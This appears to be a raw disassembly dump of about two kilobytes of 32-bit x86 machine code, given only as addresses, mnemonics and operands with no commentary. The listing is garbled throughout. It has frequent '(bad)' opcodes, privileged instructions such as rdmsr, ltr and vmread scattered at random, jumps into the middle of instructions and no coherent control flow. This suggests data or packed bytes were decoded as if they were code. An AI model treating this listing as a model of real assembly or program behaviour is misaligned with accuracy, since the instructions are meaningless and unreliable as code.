  431530:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  431537:	xlat   BYTE PTR ds:[ebx]
  431538:	dec    edx
  431539:	add    bh,bh
  43153b:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431541:	lea    esp,[esi-0x50]
  431544:	(bad)  
  431545:	(bad)  
  431546:	call   DWORD PTR [eax-0x1]
  431549:	inc    ebp
  43154a:	rdpmc  
  43154c:	add    BYTE PTR [ebx],al
  43154e:	push   ax
  431550:	lea    eax,[ebp-0x1]
  431556:	js     0x431557
  431558:	add    al,bh
  43155a:	push   bp
  43155c:	lea    ecx,[ebp-0x7701]
  431562:	fmul   DWORD PTR [ebp-0x7a997800]
  431568:	(bad)  
  431569:	(bad)  
  43156a:	(bad)  
  43156b:	(bad)  
  43156c:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431572:	dec    eax
  431573:	mov    eax,0x8d8dffff
  431578:	mov    al,0xb0
  43157a:	(bad)  
  43157b:	call   DWORD PTR [ecx+0x50]
  43157e:	dec    ebp
  43157f:	inc    ebp
  431580:	mov    esi,0x7030833
  431585:	push   eax
  431586:	into   
  431587:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43158d:	call   DWORD PTR [ecx-0x8]
  431590:	lea    edx,[ebp-0x1]
  431593:	jmp    0x761797
  431598:	inc    eax
  431599:	jnp    0x431528
  43159b:	add    dh,bh
  43159d:	inc    WORD PTR [ebp-0x8a00b0]
  4315a4:	mov    edx,eax
  4315a6:	inc    esp
  4315a7:	add    bh,bh
  4315a9:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4315af:	dec    DWORD PTR [ebx-0x7f820301]
  4315b5:	add    BYTE PTR [ecx],al
  4315b7:	data16 add BYTE PTR [ebp-0xb30077],al
  4315be:	inc    eax
  4315c0:	(bad)  
  4315c1:	dec    si
  4315c3:	test   edi,edi
  4315c5:	(bad)  
  4315c6:	cmp    edi,edi
  4315c8:	add    ecx,DWORD PTR [edi-0x39]
  4315cb:	mov    edx,DWORD PTR [edx+0x66]
  4315ce:	inc    DWORD PTR [ebp-0x3d00cb]
  4315d4:	mov    eax,0x66ff8b5e
  4315da:	jmp    0xb4ff:0xc7ff3895
  4315e1:	push   ecx
  4315e2:	inc    DWORD PTR [ebx-0x76ffccbb]
  4315e8:	call   DWORD PTR [esi-0x1]
  4315eb:	dec    DWORD PTR [eax]
  4315ed:	mov    ecx,0x805ff
  4315f2:	inc    ebp
  4315f3:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  4315f9:	mov    ecx,0x35784
  4315fe:	add    BYTE PTR [ecx-0xffa59b],cl
  431604:	inc    ebp
  431605:	mov    ecx,0x9c6131
  43160a:	(bad)  
  43160b:	mov    eax,ebx
  43160d:	pop    esp
  43160e:	test   edi,edi
  431610:	clc    
  431611:	lea    eax,[ebp-0x24]
  431614:	cmp    eax,0xc7fe9c8d
  431619:	push   eax
  43161b:	lea    eax,[ebp+0x45fff8fe]
  431621:	mov    esi,DWORD PTR [ecx]
  431623:	hlt    
  431624:	lahf   
  431625:	push   esp
  431626:	mov    edx,DWORD PTR [ecx-0x4]
  431629:	xor    eax,DWORD PTR [eax+0x7201bb]
  43162f:	add    BYTE PTR [ebp-0x35],al
  431632:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  431638:	mov    edx,DWORD PTR [ecx-0x74]
  43163b:	rol    BYTE PTR [eax],0x8d
  43163e:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431642:	nop
  431643:	push   ecx
  431644:	add    bh,bh
  431646:	mov    esp,edi
  431648:	in     al,0x85
  43164a:	jge    0x43164a
  43164c:	test   edi,edi
  43164e:	jne    0x4315d5
  431650:	(bad)  
  431651:	(bad)  
  431652:	sbb    bh,bh
  431654:	push   ebp
  431655:	inc    ebp
  431656:	call   0xffdc10e6
  43165b:	add    BYTE PTR [ebp+0x66],al
  43165e:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431664:	cmp    al,0x85
  431666:	ud0    eax,DWORD PTR [ebp-0x1]
  43166a:	test   DWORD PTR [edi+0x74],ecx
  43166d:	dec    edi
  43166e:	inc    DWORD PTR [ebp-0x530004]
  431674:	dec    DWORD PTR [edi-0x75]
  431677:	dec    esi
  431678:	cld    
  431679:	test   DWORD PTR [eax+0xff01ff],eax
  43167f:	icebp  
  431680:	add    BYTE PTR [edi-0x3a],cl
  431683:	test   ebx,eax
  431685:	inc    BYTE PTR [ebp-0x1]
  431688:	jne    0x43168a
  43168a:	mov    eax,DWORD PTR [eax]
  43168c:	cld    
  43168d:	xor    BYTE PTR [ecx+0x500155],cl
  431693:	push   ebp
  431694:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43169a:	add    BYTE PTR [ebp+0x35e90f50],al
  4316a0:	add    al,BYTE PTR [eax]
  4316a2:	add    BYTE PTR [ebx-0x38fe4f80],al
  4316a8:	add    ah,ch
  4316aa:	or     BYTE PTR [ebp+0x4501f845],dh
  4316b0:	jmp    0xdf19a6
  4316b5:	(bad)  
  4316b6:	nop    ecx
  4316b9:	test   DWORD PTR [ebp+0x4502f8],eax
  4316bf:	xor    ecx,DWORD PTR [ebp-0x64]
  4316c2:	mov    eax,edi
  4316c4:	mov    ebx,DWORD PTR [eax+edx*2]
  4316c7:	add    eax,0x45fef885
  4316cc:	dec    DWORD PTR [ebx+0x339445]
  4316d2:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4316d8:	dec    DWORD PTR [ebx-0x460f0375]
  4316de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316df:	add    esi,edi
  4316e1:	add    bh,bh
  4316e3:	rdpmc  
  4316e5:	add    BYTE PTR [ebx],0x1
  4316e8:	mov    DWORD PTR [eax],eax
  4316ea:	add    al,0x45
  4316ec:	dec    DWORD PTR [ecx-0x360b3373]
  4316f2:	dec    DWORD PTR [esi]
  4316f4:	push   eax
  4316f5:	jne    0x43173c
  4316f7:	mov    esi,DWORD PTR [ebx]
  4316f9:	cld    
  4316fa:	add    esp,ecx
  4316fc:	push   eax
  4316fd:	inc    DWORD PTR [ebp-0x75]
  431700:	add    eax,0x800e4
  431705:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43170b:	mov    DWORD PTR [ecx],eax
  43170d:	sbb    al,0x0
  43170f:	leave  
  431710:	test   DWORD PTR [edi-0x2],eax
  431713:	jne    0x431714
  431715:	call   0xff44011a
  43171a:	xor    BYTE PTR [ebp+0x4d],al
  43171d:	mov    edi,edi
  43171f:	enter  0x8,0x4d
  431723:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  431729:	mov    eax,DWORD PTR [eax]
  43172b:	cld    
  43172c:	add    DWORD PTR [ecx],ebx
  43172e:	inc    ebp
  43172f:	dec    ebp
  431730:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  431736:	inc    eax
  431737:	dec    DWORD PTR [ecx-0x270375]
  43173d:	add    BYTE PTR [ebx-0x39d72701],cl
  431743:	xchg   ecx,eax
  431744:	ret    
  431745:	add    BYTE PTR [ebp-0x830075],al
  43174b:	add    BYTE PTR [ebp-0x75],al
  43174e:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431754:	lea    edi,[edi-0xc]
  431757:	add    bh,bh
  431759:	mov    edx,DWORD PTR [eax-0x7b]
  43175c:	inc    ebp
  43175d:	rdpmc  
  43175f:	jne    0x431764
  431761:	add    BYTE PTR [eax-0x75],dl
  431764:	inc    ebp
  431765:	clc    
  431766:	add    eax,0x400009
  43176b:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431771:	mov    eax,DWORD PTR [ecx]
  431773:	in     al,dx
  431774:	add    dh,al
  431776:	test   ebx,eax
  431778:	inc    BYTE PTR [ebp-0xff0001]
  43177e:	add    BYTE PTR [ebp-0x43],al
  431781:	cmp    esi,0xfffffff8
  431784:	(bad)  
  431785:	push   DWORD PTR [eax]
  431787:	add    BYTE PTR [ebp-0x3a],dl
  43178a:	test   ebx,eax
  43178c:	je     0x431713
  43178e:	mov    edi,edi
  431790:	sbb    al,0xff
  431792:	test   DWORD PTR gs:[eax],eax
  431795:	(bad)  
  431796:	js     0x431797
  431798:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43179e:	sub    eax,ebx
  4317a0:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4317a6:	add    eax,DWORD PTR [eax]
  4317a8:	dec    ebp
  4317a9:	push   eax
  4317aa:	mov    al,BYTE PTR [ebp+0x1]
  4317ad:	mov    eax,DWORD PTR [ebp-0x68]
  4317b0:	mov    eax,DWORD PTR [eax]
  4317b2:	sbb    bh,al
  4317b4:	or     ah,dh
  4317b6:	dec    ebp
  4317b7:	inc    DWORD PTR [eax+0x4]
  4317ba:	push   ecx
  4317bb:	add    BYTE PTR [edx-0x1],dh
  4317be:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4317c4:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4317ce:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4317d4:	push   ecx
  4317d5:	cmp    BYTE PTR [ebx],al
  4317d7:	inc    ebp
  4317d8:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4317de:	(bad)  
  4317df:	(bad)  
  4317e0:	in     al,0xff
  4317e2:	add    BYTE PTR [ebp+0x0],al
  4317e5:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4317eb:	add    al,bh
  4317ed:	(bad)  
  4317ee:	jmp    0x8d85:0x74b0558d
  4317f5:	dec    DWORD PTR [eax]
  4317f7:	call   DWORD PTR [ebp-0x7b]
  4317fa:	mov    edi,esi
  4317fc:	lock call DWORD PTR [ebp-0x75]
  431800:	mov    esi,esp
  431802:	mov    ah,0xc6
  431804:	mov    bh,0xc3
  431806:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43180c:	add    DWORD PTR [eax],0x450050ff
  431812:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431818:	inc    edi
  43181a:	push   esp
  43181c:	jmp    0xcd00:0x650481ff
  431823:	mov    DWORD PTR [ebx],esi
  431825:	clc    
  431826:	cmp    edi,0xff9cff3c
  43182c:	jne    0x431836
  43182e:	mov    eax,eax
  431830:	add    esi,DWORD PTR [eax]
  431832:	int3   
  431833:	inc    ebp
  431834:	cmp    al,0x83
  431836:	add    BYTE PTR [eax],bl
  431838:	adc    DWORD PTR [ebx+0x768b5055],eax
  43183e:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431844:	mov    edi,eax
  431846:	cmp    BYTE PTR [ebp+0x45],cl
  431849:	jmp    0x4317d6
  43184b:	mov    ebx,DWORD PTR [esp+ebp*8]
  43184e:	inc    ebp
  43184f:	or     al,0x2
  431851:	dec    DWORD PTR [ebp+0x18]
  431854:	jne    0x4318ab
  431856:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  43185c:	mov    edi,DWORD PTR [ebx]
  43185e:	in     al,0x50
  431860:	xchg   ecx,eax
  431861:	jmp    0x3436766
  431866:	adc    al,0x8b
  431868:	inc    ebp
  431869:	mov    al,ds:0x8b04008b
  43186e:	push   ebp
  43186f:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431875:	push   ebp
  431876:	test   DWORD PTR [ebx-0x2800d701],ecx
  43187c:	inc    ebp
  43187d:	dec    ebp
  43187e:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431884:	mov    DWORD PTR [eax],0xe9ff00f4
  43188a:	add    al,0x0
  43188c:	add    BYTE PTR [eax],al
  43188e:	mov    eax,edx
  431890:	push   eax
  431891:	rol    DWORD PTR [ebp-0xf0177],1
  431897:	bound  eax,QWORD PTR [ebp+0x50]
  43189a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4318a0:	add    BYTE PTR [ecx+0x558df0ff],cl
  4318a6:	mov    al,0xf
  4318a8:	test   DWORD PTR [edx],edx
  4318aa:	call   DWORD PTR [ebp-0x7a0001]
  4318b0:	(bad)  
  4318b1:	loop   0x4318b2
  4318b3:	jnp    0xc6990cb9
  4318b9:	mov    eax,ebx
  4318bb:	cmp    al,0x8b
  4318bd:	(bad)  
  4318be:	cld    
  4318bf:	shr    esi,0xc
  4318c2:	add    dl,al
  4318c4:	push   eax
  4318c5:	lea    eax,[ebp-0x1]
  4318c8:	mov    edx,esi
  4318ca:	cwde   
  4318cb:	cli    
  4318cc:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4318d2:	or     BYTE PTR [eax],cl
  4318d4:	inc    ebp
  4318d5:	dec    ebp
  4318d6:	inc    DWORD PTR [ebx+0x74803914]
  4318dc:	add    DWORD PTR [ebx+0x451800],ecx
  4318e2:	call   DWORD PTR [eax+edx*1]
  4318e5:	add    ecx,DWORD PTR [ebp-0x34]
  4318e8:	push   edi
  4318e9:	adc    al,0x8
  4318eb:	mov    edx,DWORD PTR [ebp-0x14]
  4318ee:	mov    ecx,DWORD PTR [ebp+0x18]
  4318f1:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4318f5:	inc    DWORD PTR [eax+esi*8]
  4318f8:	inc    ebp
  4318f9:	stos   BYTE PTR es:[edi],al
  4318fa:	mov    edx,DWORD PTR [ebp-0x4]
  4318fd:	add    DWORD PTR [ebp-0x1c],eax
  431900:	mov    edx,DWORD PTR [ebp-0x70]
  431903:	cmp    eax,DWORD PTR [eax]
  431905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431906:	mov    eax,DWORD PTR [eax]
  431908:	cld    
  431909:	jae    0x43188b
  43190b:	add    eax,DWORD PTR [ecx]
  43190d:	clc    
  43190e:	add    BYTE PTR [eax+0x30],dl
  431911:	mov    DWORD PTR [ecx],esi
  431913:	clc    
  431914:	pop    ds
  431915:	inc    ebp
  431916:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43191c:	(bad)  
  43191d:	push   DWORD PTR [edi]
  43191f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431925:	(bad)  
  431926:	jae    0x431927
  431928:	mov    eax,DWORD PTR [ebp-0x740175]
  43192e:	sub    eax,DWORD PTR [eax]
  431930:	add    eax,DWORD PTR [eax]
  431932:	mov    DWORD PTR [ecx+0x5f],eax
  431935:	mov    DWORD PTR [ebx-0x4],ebx
  431938:	ret    0xff
  43193b:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431941:	ret    
  431942:	mov    eax,DWORD PTR [ebp-0x6f0075]
  431948:	add    BYTE PTR [ebp-0x7d],al
  43194b:	mov    DWORD PTR [eax],eax
  43194d:	add    al,0x84
  43194f:	inc    DWORD PTR [ecx]
  431951:	lea    eax,[eax]
  431953:	hlt    
  431954:	sar    bh,cl
  431956:	test   BYTE PTR [eax+0x1],dl
  431959:	inc    ebp
  43195a:	add    BYTE PTR [ebx],dh
  43195c:	test   BYTE PTR [ebx],0x84
  43195f:	push   eax
  431960:	add    BYTE PTR [ebp+0x0],al
  431963:	add    eax,0x86
  431968:	add    BYTE PTR [ebx-0x7f7b0340],cl
  43196e:	add    BYTE PTR [ecx],al
  431970:	add    BYTE PTR [eax],al
  431972:	mov    esi,0x550030
  431977:	mov    ecx,DWORD PTR [edi]
  431979:	cld    
  43197a:	fidiv  DWORD PTR [ebp+0x0]
  43197d:	mov    edi,DWORD PTR [ecx]
  43197f:	xor    BYTE PTR [eax+eax*1],0x84
  431983:	add    eax,DWORD PTR [eax]
  431985:	sbb    BYTE PTR [eax],al
  431987:	jne    0x43193a
  431989:	mov    eax,DWORD PTR [ecx]
  43198b:	sbb    BYTE PTR [eax],al
  43198d:	mov    DWORD PTR [ebp-0x1],esp
  431990:	add    BYTE PTR [eax+0x30e45ca],bh
  431996:	ret    0xb7fc
  431999:	dec    ebp
  43199a:	or     al,0x89
  43199c:	dec    ebp
  43199d:	cld    
  43199e:	cmovne ecx,DWORD PTR [eax-0x75]
  4319a2:	add    edi,esp
  4319a4:	seto   BYTE PTR [esi-0x72ffffff]
  4319ab:	inc    ebp
  4319ac:	adc    al,0x8b
  4319ae:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4319b5:	cmp    DWORD PTR [edi+0x72],edx
  4319b8:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4319be:	gs cmp al,0x0
  4319c1:	je     0x431999
  4319c3:	push   eax
  4319c4:	sar    BYTE PTR [eax],1
  4319c6:	mov    bh,0x3e
  4319c8:	push   cs
  4319c9:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4319cf:	add    DWORD PTR [ecx+0x12],ebp
  4319d2:	dec    edx
  4319d3:	(bad)  
  4319d4:	mov    eax,edx
  4319d6:	in     al,dx
  4319d7:	adc    DWORD PTR [ecx],esi
  4319d9:	pop    esi
  4319da:	inc    ecx
  4319db:	leave  
  4319dc:	or     DWORD PTR [eax],ebx
  4319de:	gs push ebp
  4319e0:	add    ah,ch
  4319e2:	into   
  4319e3:	in     al,dx
  4319e4:	enter  0xb756,0xf0
  4319e8:	push   cs
  4319e9:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4319f3:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4319f9:	jnp    0x74439f01
  4319ff:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a05:	add    BYTE PTR [edi],cl
  431a07:	mov    edi,DWORD PTR [ecx-0x78]
  431a0a:	ltr    WORD PTR [ecx-0x7b]
  431a0e:	dec    DWORD PTR [edi]
  431a10:	clc    
  431a11:	out    0x45,eax
  431a13:	add    BYTE PTR [eax],cl
  431a15:	cmp    ebx,0xffffff8c
  431a18:	jge    0x431a1a
  431a1a:	jb     0x431a2c
  431a1c:	je     0x521a9c
  431a22:	pop    edx
  431a23:	push   esi
  431a24:	mov    ecx,DWORD PTR [edi]
  431a26:	in     al,dx
  431a27:	rol    DWORD PTR [ebp+0x0],1
  431a2a:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431a31:	cmp    DWORD PTR [ecx],0xfffffff0
  431a34:	hlt    
  431a35:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431a3b:	(bad)  
  431a3d:	push   eax
  431a3e:	jns    0xb842febc
  431a44:	lock push cs
  431a46:	ror    edx,0x3
  431a49:	test   BYTE PTR [ecx+0x5500e800],cl
  431a4f:	dec    eax
  431a50:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431a54:	(bad)  
  431a55:	mov    esi,0x7f33ff5f
  431a5a:	inc    eax
  431a5b:	test   DWORD PTR [edx],eax
  431a5d:	je     0x431a1f
  431a5f:	mov    ecx,ecx
  431a61:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431a65:	and    eax,DWORD PTR [eax+0xf0103]
  431a6b:	jp     0x431a59
  431a6d:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431a71:	add    edx,DWORD PTR [edi+0x74]
  431a74:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431a7a:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a80:	je     0x431a05
  431a82:	cmp    eax,edi
  431a84:	js     0x431aa9
  431a86:	add    eax,0xeb0fc003
  431a8b:	jns    0x431a18
  431a8d:	vmread DWORD PTR [ecx+0x45],ebx
  431a91:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431a97:	adc    al,0x8b
  431a99:	jge    0x431aaf
  431a9b:	mov    edi,DWORD PTR [eax-0x4]
  431a9e:	add    edi,DWORD PTR [edi]
  431aa0:	or     bh,bh
  431aa2:	push   ebp
  431aa3:	push   es
  431aa4:	mov    DWORD PTR [ebp-0x4],ebx
  431aa7:	add    edi,esi
  431aa9:	pop    es
  431aaa:	add    esi,DWORD PTR [edi-0x48ccf183]
  431ab0:	mov    DWORD PTR [esp+esi*8],ecx
  431ab3:	inc    ebp
  431ab4:	pop    ebp
  431ab5:	xor    DWORD PTR [esi-0x4],0x3b
  431ab9:	add    edx,DWORD PTR [ecx+edi*1]
  431abc:	push   es
  431abd:	clc    
  431abe:	mov    bh,0xdb
  431ac0:	jp     0x431a79
  431ac2:	add    cl,BYTE PTR [esi]
  431ac4:	div    DWORD PTR [edi+0x4d8b0c1c]
  431aca:	test   edi,edi
  431acc:	je     0x431ac2
  431ace:	mov    eax,ecx
  431ad0:	or     BYTE PTR [ebx],al
  431ad2:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431ad8:	jbe    0x431b4c
  431ada:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431ae0:	add    ecx,DWORD PTR [esi]
  431ae2:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431ae8:	add    eax,DWORD PTR [ebx-0x287af783]
  431aee:	je     0x431b3d
  431af0:	mov    DWORD PTR [ecx],edi
  431af2:	mov    esi,eax
  431af4:	hlt    
  431af5:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431afc:	jb     0x431abe
  431afe:	jmp    0x431aeb
  431b00:	xor    esi,DWORD PTR [ebx]
  431b02:	pop    edi
  431b03:	pop    esi
  431b04:	pop    ebx
  431b05:	ret    
  431b06:	ret    0x8b
  431b09:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b0f:	xor    DWORD PTR [ecx],0xc
  431b12:	pushf  
  431b13:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b19:	rdmsr  
  431b1b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431b22:	dec    ebp
  431b23:	ret    
  431b24:	mov    edi,DWORD PTR [esi-0x4]
  431b27:	pop    eax
  431b28:	dec    ebp
  431b29:	jne    0x431ab6
  431b2b:	xor    edi,esp
  431b2d:	inc    eax
  431b2e:	dec    ebp
  431b2f:	jbe    0x431b84
  431b31:	inc    eax
  431b32:	pop    ebp
  431b33:	add    edx,DWORD PTR [esi+0x8]
  431b36:	push   esp
  431b37:	dec    eax
  431b38:	push   ecx
  431b39:	mov    eax,edi
  431b3b:	and    al,0xf0
  431b3d:	jo     0x431b2a
  431b3f:	mov    eax,DWORD PTR [ebx]
  431b41:	sbb    BYTE PTR [ebp+0x4d],cl
  431b44:	mov    eax,DWORD PTR [ebx]
  431b46:	nop
  431b47:	or     BYTE PTR [eax],al
  431b49:	jne    0x431ba2
  431b4b:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431b51:	cld    
  431b52:	xor    edi,edi
  431b54:	add    edi,DWORD PTR [ebp+0x3]
  431b57:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431b5d:	js     0x431ae3
  431b5f:	jae    0x431b63
  431b61:	(bad)  
  431b63:	xor    al,0x5d
  431b65:	jmp    0x431af2
  431b67:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431b6e:	fdecstp 
  431b70:	test   BYTE PTR [edi],ah
  431b72:	add    bh,BYTE PTR [ebp+0x0]
  431b75:	add    ebx,DWORD PTR [ebp-0x77]
  431b78:	mov    edi,eax
  431b7a:	cmp    al,0x0
  431b7d:	adc    dh,BYTE PTR [ebx]
  431b7f:	jge    0x431b84
  431b81:	mov    edi,DWORD PTR [ebx]
  431b83:	jl     0x431b94
  431b85:	clc    
  431b86:	dec    edi
  431b87:	jge    0x431b89
  431b89:	mov    eax,DWORD PTR [ebx]
  431b8b:	jb     0x431b95
  431b8d:	mov    ecx,DWORD PTR [ebp-0x8]
  431b90:	mov    edi,edi
  431b92:	xor    edx,DWORD PTR [eax]
  431b94:	add    edi,DWORD PTR [ebx]
  431b96:	mov    DWORD PTR [ebp-0x10],edi
  431b99:	inc    edi
  431b9a:	pop    ebp
  431b9b:	jge    0x431bd8
  431b9d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431ba1:	mov    edx,0xc05d87f0
  431ba6:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431baa:	fimul  WORD PTR [eax]
  431bac:	fist   WORD PTR [ebp+0x1c]
  431baf:	in     al,dx
  431bb0:	jne    0x431b9e
  431bb2:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431bb8:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431bbc:	fdivp  st(0),st
  431bbe:	fild   WORD PTR [ebp+0x4510f85c]
  431bc4:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431bca:	inc    ebp
  431bcb:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431bd1:	mov    ebp,DWORD PTR [ebx-0x4]
  431bd4:	adc    al,0x8b
  431bd6:	rcl    DWORD PTR [eax],0x48
  431bd9:	mov    esi,0x7080803
  431bde:	fiadd  WORD PTR [ebp+0x4d]
  431be1:	(bad)  
  431be2:	mov    edx,DWORD PTR [edx-0x4]
  431be5:	mov    edx,DWORD PTR [ebp-0x4]
  431be8:	xor    ebx,DWORD PTR [ebx+0x330103]
  431bee:	mov    DWORD PTR [edi+0x872dc],edi
  431bf4:	xlat   BYTE PTR ds:[ebx]
  431bf5:	into   
  431bf6:	ffreep st(6)
  431bf8:	retf   0x6c7
  431bfb:	iret   
  431bfc:	dec    ebp
  431bfd:	inc    ebp
  431bfe:	mov    DWORD PTR [ebx],edi
  431c00:	fmul   QWORD PTR [edi]
  431c02:	dec    ebp
  431c03:	jnp    0x431c38
  431c05:	add    BYTE PTR [ebx],al
  431c07:	mov    ecx,DWORD PTR [esp+edi*8]
  431c0a:	inc    ebp
  431c0b:	dec    ebp
  431c0c:	lea    esi,[ebx]
  431c0e:	add    DWORD PTR [ebx],eax
  431c10:	jb     0x431c4d
  431c12:	add    BYTE PTR [edi],cl
  431c14:	inc    ebp
  431c15:	imul   eax,edi,0x858bd800
  431c1b:	cld    
  431c1c:	clc    
  431c1d:	mov    DWORD PTR [ebp+0x0],eax
  431c20:	inc    DWORD PTR [eax]
  431c22:	or     al,0xde
  431c24:	sbb    bh,0x1
  431c27:	retf   
  431c28:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431c2f:	dec    ebp
  431c30:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431c36:	enter  0x12de,0xdf
  431c3a:	inc    ebp
  431c3b:	pop    ebp
  431c3c:	dec    DWORD PTR [ebx-0x257f0ff4]
  431c42:	add    DWORD PTR [edx],edx
  431c44:	add    BYTE PTR [ebp+0x50],dl
  431c47:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431c4d:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431c53:	or     ah,al
  431c55:	pop    ss
  431c56:	cdq    
  431c57:	push   ebp
  431c58:	clc    
  431c59:	mov    eax,DWORD PTR [ebp-0x4]
  431c5c:	xor    edx,edx
  431c5e:	add    esi,DWORD PTR [ebx]
  431c60:	cmp    eax,DWORD PTR [ebx]
  431c62:	hlt    
  431c63:	cmp    DWORD PTR [ebx],esp
  431c65:	or     al,BYTE PTR [ebp+0xf]
  431c68:	mov    eax,DWORD PTR [edx]
  431c6a:	loopne 0x431c6c
  431c6c:	(bad)  
  431c6d:	mov    ecx,esi
  431c6f:	cld    
  431c70:	pushf  
  431c71:	pop    ebp
  431c72:	fwait
  431c73:	mov    esi,DWORD PTR [edx]
  431c75:	lock mov eax,eax
  431c78:	adc    BYTE PTR [ebx],al
  431c7a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c81:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c87:	dec    ebp
  431c88:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431c8e:	(bad)  
  431c8f:	iret   
  431c90:	inc    ebp
  431c91:	(bad)  
  431c92:	jne    0x431ce1
  431c94:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431c9a:	(bad)  
  431c9b:	cmp    ebx,eax
  431c9d:	je     0x431c25
  431c9f:	add    edi,edi
  431ca1:	or     bh,bh
  431ca3:	dec    ebp
  431ca4:	inc    ebp
  431ca5:	mov    esi,DWORD PTR [ebx]
  431ca7:	cld    
  431ca8:	add    ecx,esi
  431caa:	cmp    ecx,DWORD PTR [eax-0xc]
  431cad:	mov    edx,DWORD PTR [edi]
  431caf:	or     BYTE PTR [ebp-0x7c],al
  431cb2:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431cb8:	test   BYTE PTR [ebx+ebx*4],cl
  431cbb:	inc    ebp
  431cbc:	xor    bh,BYTE PTR [esi]
  431cbe:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431cc5:	jne    0x431c8e
  431cc7:	mov    ebp,esp
  431cc9:	fcomp  DWORD PTR [ebx]
  431ccb:	add    BYTE PTR [ecx],al
  431ccd:	inc    DWORD PTR [ebp-0x75]
  431cd0:	(bad)  
  431cd1:	cld    
  431cd2:	add    al,0xce
  431cd4:	mov    ecx,edi
  431cd6:	cld    
  431cd7:	inc    ebp
  431cd8:	fidivr WORD PTR [ebx]
  431cda:	fbstp  TBYTE PTR [ebp-0x3e]
  431cdd:	mov    eax,DWORD PTR [eax]
  431cdf:	adc    BYTE PTR [ebx-0x3974038b],cl
  431ce5:	fadd   st,st(7)
  431ce7:	add    BYTE PTR [ebp-0x1],al
  431cea:	mov    ecx,DWORD PTR [esp+edi*8]
  431ced:	inc    ebp
  431cee:	mov    bh,0xc7
  431cf1:	loopne 0x431d38
  431cf3:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431cf9:	sbb    dh,BYTE PTR [ebx]
  431cfb:	pushf  
  431cfc:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d02:	mov    eax,edi
  431d04:	cwde   
  431d05:	inc    ebp
  431d06:	inc    ebp
  431d07:	jne    0x431c94
  431d09:	mov    esp,esp
  431d0b:	clc    
  431d0c:	add    al,0x4d
  431d0e:	mov    DWORD PTR [ebx],esi
  431d10:	or     al,0x33
  431d12:	inc    ebp
  431d13:	lea    ecx,[ebx-0x398d13fd]
  431d19:	add    bh,al
  431d1b:	inc    ebp
  431d1c:	ror    DWORD PTR [ebx+0x45d829],0x8b
